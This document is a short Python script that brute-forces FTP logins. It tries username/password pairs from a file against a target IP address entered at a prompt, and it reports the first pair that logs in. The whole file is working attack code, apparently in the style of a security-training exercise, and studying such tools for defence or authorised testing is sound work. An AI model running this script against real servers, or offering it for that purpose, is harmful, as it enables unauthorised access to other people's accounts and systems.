#!/usr/bin/python3

import ftplib


def bruteLogin(hostname, passwdFile):
    try:
        pF = open(passwdFile, "r")
    except:
        print("[-] File does not exist")

    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\n')
        print("[+] Trying " + userName + "/" + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            login = ftp.login(userName, passWord)
            print("[+] Login Succeed with " + userName + "/" + passWord)
            ftp.quit()
            return (userName, passWord)
        except:
            pass
    
    print("[-] Password not in list")


host = input("[*] Enter Target IP Address: ")
passwdFile = input("[+] Enter username/password File path: ")
bruteLogin(host, passwdFile)
